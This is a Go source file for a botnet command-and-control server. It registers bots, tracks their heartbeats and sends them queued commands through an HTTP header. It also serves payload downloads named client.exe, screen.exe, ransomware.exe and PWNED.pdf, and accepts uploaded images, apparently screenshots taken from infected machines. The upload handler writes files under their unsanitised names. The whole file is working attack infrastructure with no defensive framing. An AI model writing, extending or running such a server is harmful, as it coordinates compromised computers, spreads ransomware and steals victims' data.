package main

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/mux"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")

//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")

type bot struct {
	Id       string `json:"bot_id"`
	Status   string `json:"status"`
	Lastseen string `json:"lastseen"`
	Command  string `json:"command"`
}

func getBots() (bots []bot) {
	fileBytes, err := ioutil.ReadFile("./bots.json")

	if err != nil {
		panic(err)
	}

	err = json.Unmarshal(fileBytes, &bots)

	if err != nil {
		panic(err)
	}

	return bots
}

func saveBots(bots []bot) {

	botBytes, err := json.Marshal(bots)
	if err != nil {
		panic(err)
	}

	err = ioutil.WriteFile("./bots.json", botBytes, 0666)
	if err != nil {
		panic(err)
	}
}

func showbots(res http.ResponseWriter, req *http.Request) {

	bots := getBots()

	for i, _ := range bots {
		_, err := fmt.Fprintf(res, "%s, %s,", bots[i].Id, bots[i].Status)
		if err != nil {
			return
		}
		fmt.Fprintln(res, " ", bots[i].Lastseen)
	}
}

func register(rw http.ResponseWriter, req *http.Request) {
	var b bot
	var check = 0

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	bots := getBots()

	for i, _ := range bots {
		if bots[i].Id == b.Id {
			//fmt.Printf("Bot %s reconnected!\n", b.Id)
			bots[i].Status = b.Status
			bots[i].Lastseen = b.Lastseen
			saveBots(bots)
			check = 1
		}
	}
	if check == 0 {
		fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
		fmt.Println("Time registered: ", b.Lastseen)
		bots = append(bots, b)
		saveBots(bots)
		_, err = fmt.Fprintf(rw, "Registered!\n")
		if err != nil {
			return
		}
	}
}

func heartbeat(res http.ResponseWriter, req *http.Request) {
	var b bot
	bots := getBots()

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(res, err.Error(), http.StatusBadRequest)
		return
	}

	for i, _ := range bots {
		if bots[i].Id == b.Id {
			bots[i].Status = b.Status
			bots[i].Lastseen = b.Lastseen
			if bots[i].Command != "" {
				fmt.Printf("Sending command '%s' to bot %s\n", bots[i].Command, bots[i].Id)
				res.Header().Add("Command", bots[i].Command)
				bots[i].Command = ""
			}
			saveBots(bots)
		}
	}
}

var botflag = 0

func statusupdater() {
	bots := getBots()
	for true {
		time.Sleep(time.Second)
		if len(bots) > 0 {
			for i, _ := range bots {
				if bots[i].Status == "alive" {
					start, _ := time.Parse(time.RFC850, bots[i].Lastseen)
					start = start.UTC()
					end := time.Now().UTC()
					diff := end.Sub(start)
					//fmt.Printf("Diff for bot %d: %.2f\n", i, diff.Seconds())
					if diff.Seconds() > 6 {
						bots[i].Status = "dead"
						saveBots(bots)
						fmt.Printf("bot %s died\n", bots[i].Id)
						botflag = 1
					} else {
						if botflag == 1 {
							fmt.Printf("bot %s revived\n", bots[i].Id)
							botflag = 0
						}
					}
				}
			}
		}
		bots = getBots()
	}
}

func pdfserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
}

func clientserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
}

func screenserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/screen.exe"))
}

func ransomwareserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/ransomware.exe"))
}

func uploadFile(res http.ResponseWriter, req *http.Request) {
	fmt.Println("File Upload Endpoint Hit")

	err := req.ParseMultipartForm(32 << 20) // maxMemory 32MB
	if err != nil {
		res.WriteHeader(http.StatusBadRequest)
		return
	}
	//Access the photo key - First Approach
	file, h, err := req.FormFile("photo")
	if err != nil {
		res.WriteHeader(http.StatusBadRequest)
		return
	}
	tmpfile, err := os.Create("../files/images/" + h.Filename)
	defer tmpfile.Close()
	if err != nil {
		res.WriteHeader(http.StatusInternalServerError)
		return
	}
	_, err = io.Copy(tmpfile, file)
	if err != nil {
		res.WriteHeader(http.StatusInternalServerError)
		return
	}

	res.WriteHeader(200)
	return
}

func newRouter() *mux.Router {
	r := mux.NewRouter()

	fmt.Printf("Starting server at port 8081\n")

	r.HandleFunc("/pdf", pdfserver)

	r.HandleFunc("/register", register)

	r.HandleFunc("/client", clientserver)

	r.HandleFunc("/screen", screenserver)

	r.HandleFunc("/ransomware", ransomwareserver)

	r.HandleFunc("/showbots", showbots)

	r.HandleFunc("/heartbeat", heartbeat)

	r.HandleFunc("/upload", uploadFile)

	return r
}

func main() {
	r := newRouter()

	wg := new(sync.WaitGroup)

	wg.Add(2)

	log.Println("Listening...")

	go func() {
		log.Fatal(http.ListenAndServe("localhost:8081", r))
		wg.Done()
	}()

	go func() {
		statusupdater()
		wg.Done()
	}()

	wg.Wait()

}
